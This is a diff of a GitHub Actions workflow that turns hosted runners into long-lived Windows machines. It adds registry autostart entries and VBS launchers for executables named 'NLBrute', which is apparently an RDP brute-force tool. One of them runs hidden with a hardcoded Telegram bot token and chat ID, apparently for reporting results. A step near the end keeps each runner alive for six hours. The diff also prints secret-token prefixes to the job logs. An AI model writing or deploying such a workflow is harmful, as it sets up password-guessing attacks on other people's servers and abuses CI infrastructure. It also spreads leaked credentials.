@@ -122,8 +122,8 @@ jobs:
 
       - name: 6.5. Save Tailscale IP to vpmaj Repo
         env:
-          # Use your custom PAT named MY_TOKEN
-          GITHUB_TOKEN: ${{ secrets.MY_TOKEN }}
+          # Use the exact lowercase name you provided: mytoken
+          API_TOKEN: ${{ secrets.mytoken }}
           TS_IP: ${{ env.TS_IP }}
           MATRIX_ID: ${{ matrix.server_id }}
         shell: bash
@@ -137,19 +137,23 @@ jobs:
           TOKEN="***"
           MSG="Add Tailscale IP for server-$MATRIX_ID: $IP"
 
+          # DEBUG: Verify Token Loading
+          echo "--- Token Debugging ---"
+          if [ -z "$TOKEN" ]; then
+            echo "ERROR: API_TOKEN is empty. Did you set the secret 'mytoken' correctly?"
+            exit 1
+          fi
+          echo "Token Length: ${#TOKEN}"
+          echo "Token Prefix: ${TOKEN:0:7}..."
+          echo "---------------------"
+
           if [ -z "$IP" ]; then
             echo "ERROR: TS_IP is empty. Cannot proceed."
             exit 1
           fi
 
-          if [ -z "$TOKEN" ]; then
-            echo "ERROR: GITHUB_TOKEN is empty. Did you set the MY_TOKEN secret?"
-            exit 1
-          fi
-
-          echo "Using token: ${TOKEN:0:10}..." # Print first 10 chars to verify it's the right token
-
           # 1. Try to fetch existing file
+          echo "Fetching existing file..."
           RESPONSE=$(curl -sS -w "\n%{http_code}" \
             -H "Authorization: Bearer $TOKEN" \
             -H "Accept: application/vnd.github.v3+json" \
@@ -159,6 +163,8 @@ jobs:
           HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
           # Extract body (everything else)
           BODY=$(echo "$RESPONSE" | sed '$d')
+
+          echo "API Response Code: $HTTP_CODE"
 
           if [ "$HTTP_CODE" -eq 200 ]; then
             echo "Found existing file. Extracting SHA and Content..."
@@ -264,7 +270,7 @@ jobs:
           while ($foundZip -and $iteration -lt $maxIterations) {
               $iteration++
               $zips = Get-ChildItem -Path $env:WORK_DIR -Filter "*.zip" -Recurse
-              if ($zips.Count -eq 0) { $foundZip = $false } 
+                            if ($zips.Count -eq 0) { $foundZip = $false } 
               else {
                   foreach ($zip in $zips) {
                       $targetFolder = $zip.DirectoryName
@@ -314,4 +320,25 @@ jobs:
               $exeDir1 = Split-Path $exePath1 -Parent
               $vbsFile1 = "$($env:WORK_DIR)\launcher_manager.vbs"
               $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'WshShell.Run "' + $exePath1 + '", 1, False'
-              $vbs
+              $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
+              New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
+              Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
+          }
+
+          # APP 2 Setup
+          if ($exeFile2) {
+              $exePath2 = $exeFile2.FullName
+              $exeDir2 = Split-Path $exePath2 -Parent
+              $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
+              $vbsFile2 = "$($env:WORK_DIR)\launcher_monitor.vbs"
+              $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
+              $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
+              New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
+          }
+
+      - name: 8. Keep Server Alive (6 Hours)
+        run: |
+          for ($i = 1; $i -le 360; $i++) {
+            Start-Sleep -Seconds 60
+            Write-Host "[Server ${{ matrix.server_id }}] Running..."
+          }
